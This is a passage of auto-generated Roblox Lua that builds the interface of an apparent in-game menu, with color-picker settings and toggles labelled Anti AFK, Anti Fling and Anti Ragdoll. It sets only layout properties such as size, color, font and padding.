G2L["123"] = Instance.new("Frame", G2L["121"]);
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["123"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["123"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["123"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["123"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.outlineStroke
G2L["124"] = Instance.new("UIStroke", G2L["123"]);
G2L["124"]["Thickness"] = 2;
G2L["124"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.toggleFade
G2L["125"] = Instance.new("CanvasGroup", G2L["123"]);
G2L["125"]["BorderSizePixel"] = 0;
G2L["125"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["125"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["125"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["125"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["125"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame.toggleFade.UIGradient
G2L["126"] = Instance.new("UIGradient", G2L["125"]);
G2L["126"]["Rotation"] = 90;
G2L["126"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text
G2L["127"] = Instance.new("TextLabel", G2L["120"]);
G2L["127"]["TextWrapped"] = true;
G2L["127"]["ZIndex"] = 10;
G2L["127"]["BorderSizePixel"] = 0;
G2L["127"]["TextSize"] = 14;
G2L["127"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["127"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["BackgroundTransparency"] = 1;
G2L["127"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["Text"] = [[Center Color Picker]];
G2L["127"]["Name"] = [[text]];
G2L["127"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text.UIPadding
G2L["128"] = Instance.new("UIPadding", G2L["127"]);
G2L["128"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.text.text
G2L["129"] = Instance.new("UIStroke", G2L["127"]);
G2L["129"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.UIPadding
G2L["12a"] = Instance.new("UIPadding", G2L["120"]);
G2L["12a"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme
G2L["12b"] = Instance.new("Frame", G2L["e3"]);
G2L["12b"]["BorderSizePixel"] = 0;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12b"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["12b"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["12b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["Name"] = [[guicolortheme]];
G2L["12b"]["LayoutOrder"] = 2;
G2L["12b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.UIPadding
G2L["12c"] = Instance.new("UIPadding", G2L["12b"]);
G2L["12c"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme
G2L["12d"] = Instance.new("TextButton", G2L["12b"]);
G2L["12d"]["BorderSizePixel"] = 0;
G2L["12d"]["TextTransparency"] = 1;
G2L["12d"]["TextSize"] = 14;
G2L["12d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12d"]["ZIndex"] = 40;
G2L["12d"]["BackgroundTransparency"] = 1;
G2L["12d"]["Size"] = UDim2.new(0, 40, 1, 0);
G2L["12d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["Name"] = [[guicolortheme]];
G2L["12d"]["Position"] = UDim2.new(1, -40, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.colorFrame
G2L["12e"] = Instance.new("Frame", G2L["12d"]);
G2L["12e"]["ZIndex"] = 99;
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Name"] = [[colorFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.colorFrame.UIStroke
G2L["12f"] = Instance.new("UIStroke", G2L["12e"]);
G2L["12f"]["Transparency"] = 0.5;
G2L["12f"]["Thickness"] = 1.5;
G2L["12f"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.guicolortheme.UIPadding
G2L["130"] = Instance.new("UIPadding", G2L["12d"]);
G2L["130"]["PaddingTop"] = UDim.new(0, 4);
G2L["130"]["PaddingRight"] = UDim.new(0, 5);
G2L["130"]["PaddingLeft"] = UDim.new(0, 5);
G2L["130"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text
G2L["131"] = Instance.new("TextLabel", G2L["12b"]);
G2L["131"]["TextWrapped"] = true;
G2L["131"]["ZIndex"] = 10;
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextSize"] = 14;
G2L["131"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["131"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["BackgroundTransparency"] = 1;
G2L["131"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[GUI Color:]];
G2L["131"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text.UIPadding
G2L["132"] = Instance.new("UIPadding", G2L["131"]);
G2L["132"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guicolortheme.text.text
G2L["133"] = Instance.new("UIStroke", G2L["131"]);
G2L["133"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main
G2L["134"] = Instance.new("ScrollingFrame", G2L["35"]);
G2L["134"]["Visible"] = false;
G2L["134"]["Active"] = true;
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["134"]["Name"] = [[Main]];
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["134"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["134"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["ScrollBarThickness"] = 0;
G2L["134"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside
G2L["135"] = Instance.new("Frame", G2L["134"]);
G2L["135"]["BorderSizePixel"] = 0;
G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["135"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Name"] = [[rightside]];
G2L["135"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.UIListLayout
G2L["136"] = Instance.new("UIListLayout", G2L["135"]);
G2L["136"]["Padding"] = UDim.new(0, 5);
G2L["136"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab
G2L["137"] = Instance.new("Frame", G2L["135"]);
G2L["137"]["BorderSizePixel"] = 0;
G2L["137"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["137"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["137"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["137"]["Name"] = [[antiTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
G2L["138"] = Instance.new("LocalScript", G2L["137"]);
G2L["138"]["Name"] = [[antiScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.UIListLayout
G2L["139"] = Instance.new("UIListLayout", G2L["137"]);
G2L["139"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["139"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.greystroke
G2L["13a"] = Instance.new("UIStroke", G2L["137"]);
G2L["13a"]["ZIndex"] = 99;
G2L["13a"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["13a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13a"]["Name"] = [[greystroke]];
G2L["13a"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======
G2L["13b"] = Instance.new("Frame", G2L["137"]);
G2L["13b"]["BorderSizePixel"] = 0;
G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13b"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13b"]["Name"] = [[======ACCENT======]];
G2L["13b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor
G2L["13c"] = Instance.new("Frame", G2L["13b"]);
G2L["13c"]["BorderSizePixel"] = 0;
G2L["13c"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["13c"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["13c"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["13c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13c"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor.UICorner
G2L["13d"] = Instance.new("UICorner", G2L["13c"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk
G2L["13e"] = Instance.new("Frame", G2L["137"]);
G2L["13e"]["BorderSizePixel"] = 0;
G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["13e"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Name"] = [[afk]];
G2L["13e"]["LayoutOrder"] = 2;
G2L["13e"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button
G2L["13f"] = Instance.new("TextButton", G2L["13e"]);
G2L["13f"]["BorderSizePixel"] = 0;
G2L["13f"]["TextTransparency"] = 1;
G2L["13f"]["TextSize"] = 14;
G2L["13f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13f"]["ZIndex"] = 50;
G2L["13f"]["BackgroundTransparency"] = 1;
G2L["13f"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.UIPadding
G2L["140"] = Instance.new("UIPadding", G2L["13f"]);
G2L["140"]["PaddingTop"] = UDim.new(0, 3);
G2L["140"]["PaddingRight"] = UDim.new(0, 3);
G2L["140"]["PaddingLeft"] = UDim.new(0, 3);
G2L["140"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame
G2L["141"] = Instance.new("Frame", G2L["13f"]);
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["141"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["141"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["141"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["141"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.outlineStroke
G2L["142"] = Instance.new("UIStroke", G2L["141"]);
G2L["142"]["Thickness"] = 2;
G2L["142"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade
G2L["143"] = Instance.new("CanvasGroup", G2L["141"]);
G2L["143"]["BorderSizePixel"] = 0;
G2L["143"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["143"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["143"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["143"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["143"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade.UIGradient
G2L["144"] = Instance.new("UIGradient", G2L["143"]);
G2L["144"]["Rotation"] = 90;
G2L["144"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text
G2L["145"] = Instance.new("TextLabel", G2L["13e"]);
G2L["145"]["TextWrapped"] = true;
G2L["145"]["ZIndex"] = 10;
G2L["145"]["BorderSizePixel"] = 0;
G2L["145"]["TextSize"] = 14;
G2L["145"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["145"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["BackgroundTransparency"] = 1;
G2L["145"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["145"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["145"]["Text"] = [[Anti AFK]];
G2L["145"]["Name"] = [[text]];
G2L["145"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.UIPadding
G2L["146"] = Instance.new("UIPadding", G2L["145"]);
G2L["146"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.text
G2L["147"] = Instance.new("UIStroke", G2L["145"]);
G2L["147"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.UIPadding
G2L["148"] = Instance.new("UIPadding", G2L["13e"]);
G2L["148"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling
G2L["149"] = Instance.new("Frame", G2L["137"]);
G2L["149"]["BorderSizePixel"] = 0;
G2L["149"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["149"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["149"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["149"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["149"]["Name"] = [[fling]];
G2L["149"]["LayoutOrder"] = 2;
G2L["149"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button
G2L["14a"] = Instance.new("TextButton", G2L["149"]);
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextTransparency"] = 1;
G2L["14a"]["TextSize"] = 14;
G2L["14a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14a"]["ZIndex"] = 50;
G2L["14a"]["BackgroundTransparency"] = 1;
G2L["14a"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.UIPadding
G2L["14b"] = Instance.new("UIPadding", G2L["14a"]);
G2L["14b"]["PaddingTop"] = UDim.new(0, 3);
G2L["14b"]["PaddingRight"] = UDim.new(0, 3);
G2L["14b"]["PaddingLeft"] = UDim.new(0, 3);
G2L["14b"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame
G2L["14c"] = Instance.new("Frame", G2L["14a"]);
G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["14c"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["14c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["14c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["14c"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.outlineStroke
G2L["14d"] = Instance.new("UIStroke", G2L["14c"]);
G2L["14d"]["Thickness"] = 2;
G2L["14d"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade
G2L["14e"] = Instance.new("CanvasGroup", G2L["14c"]);
G2L["14e"]["BorderSizePixel"] = 0;
G2L["14e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["14e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14e"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade.UIGradient
G2L["14f"] = Instance.new("UIGradient", G2L["14e"]);
G2L["14f"]["Rotation"] = 90;
G2L["14f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text
G2L["150"] = Instance.new("TextLabel", G2L["149"]);
G2L["150"]["TextWrapped"] = true;
G2L["150"]["ZIndex"] = 10;
G2L["150"]["BorderSizePixel"] = 0;
G2L["150"]["TextSize"] = 14;
G2L["150"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["150"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["BackgroundTransparency"] = 1;
G2L["150"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["Text"] = [[Anti Fling]];
G2L["150"]["Name"] = [[text]];
G2L["150"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.UIPadding
G2L["151"] = Instance.new("UIPadding", G2L["150"]);
G2L["151"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.text
G2L["152"] = Instance.new("UIStroke", G2L["150"]);
G2L["152"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.UIPadding
G2L["153"] = Instance.new("UIPadding", G2L["149"]);
G2L["153"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll
G2L["154"] = Instance.new("Frame", G2L["137"]);
G2L["154"]["BorderSizePixel"] = 0;
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["154"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["154"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["Name"] = [[ragdoll]];
G2L["154"]["LayoutOrder"] = 4;
G2L["154"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button
G2L["155"] = Instance.new("TextButton", G2L["154"]);
G2L["155"]["BorderSizePixel"] = 0;
G2L["155"]["TextTransparency"] = 1;
G2L["155"]["TextSize"] = 14;
G2L["155"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["155"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["155"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["155"]["ZIndex"] = 50;
G2L["155"]["BackgroundTransparency"] = 1;
G2L["155"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["155"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["155"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.UIPadding
G2L["156"] = Instance.new("UIPadding", G2L["155"]);
G2L["156"]["PaddingTop"] = UDim.new(0, 3);
G2L["156"]["PaddingRight"] = UDim.new(0, 3);
G2L["156"]["PaddingLeft"] = UDim.new(0, 3);
G2L["156"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame
G2L["157"] = Instance.new("Frame", G2L["155"]);
G2L["157"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["157"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["157"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["157"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["157"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.outlineStroke
G2L["158"] = Instance.new("UIStroke", G2L["157"]);
G2L["158"]["Thickness"] = 2;
G2L["158"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade
G2L["159"] = Instance.new("CanvasGroup", G2L["157"]);
G2L["159"]["BorderSizePixel"] = 0;
G2L["159"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["159"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade.UIGradient
G2L["15a"] = Instance.new("UIGradient", G2L["159"]);
G2L["15a"]["Rotation"] = 90;
G2L["15a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text
G2L["15b"] = Instance.new("TextLabel", G2L["154"]);
G2L["15b"]["TextWrapped"] = true;
G2L["15b"]["ZIndex"] = 10;
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextSize"] = 14;
G2L["15b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["BackgroundTransparency"] = 1;
G2L["15b"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Text"] = [[Anti Ragdoll]];
G2L["15b"]["Name"] = [[text]];
G2L["15b"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.UIPadding
G2L["15c"] = Instance.new("UIPadding", G2L["15b"]);
G2L["15c"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.text
G2L["15d"] = Instance.new("UIStroke", G2L["15b"]);
G2L["15d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.UIPadding
G2L["15e"] = Instance.new("UIPadding", G2L["154"]);
G2L["15e"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void
G2L["15f"] = Instance.new("Frame", G2L["137"]);
G2L["15f"]["BorderSizePixel"] = 0;
G2L["15f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15f"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["15f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["15f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15f"]["Name"] = [[void]];
G2L["15f"]["LayoutOrder"] = 2;
G2L["15f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button
G2L["160"] = Instance.new("TextButton", G2L["15f"]);
G2L["160"]["BorderSizePixel"] = 0;
G2L["160"]["TextTransparency"] = 1;
G2L["160"]["TextSize"] = 14;
